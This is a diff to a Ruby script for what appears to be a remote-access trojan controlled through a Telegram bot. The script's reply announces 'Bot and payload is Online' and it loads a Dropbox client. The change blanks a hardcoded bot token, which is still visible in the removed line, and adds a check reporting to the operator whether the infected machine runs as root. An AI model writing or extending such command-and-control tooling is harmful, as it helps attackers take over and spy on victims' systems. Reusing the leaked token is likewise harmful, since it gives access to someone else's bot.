@@ -8,8 +8,11 @@ require "json"
 require "dropbox_api"
 
 #Token bot
-$TOKEN = "304212840:AAHTNXoYw97LbyPbQL1F-su5mQKek7_neJo" 
+$TOKEN = "" 
 
+def check_root
+    isRoot = Process.uid.zero?
+end
 
 Telegram::Bot::Client.run($TOKEN, logger: Logger.new($stdout)) do |bot|
     begin
@@ -18,8 +21,9 @@ Telegram::Bot::Client.run($TOKEN, logger: Logger.new($stdout)) do |bot|
 
             case message.text
             when '/start'
-                bot.api.send_message(chat_id: message.chat.id, text: "Hello, #{message.from.first_name}\n\n[+] Bot and payload is Online\n\nEnter /help to see commands!")
-            
+                isRoot = check_root
+                bot.api.send_message(chat_id: message.chat.id, text: "Hello, #{message.from.first_name}\n\n[+] Bot and payload is Online\nAccess system is Root? : #{isRoot}\n\nEnter /help to see commands!")
+                
             #Help command
             when '/help'
                 help = """Help:
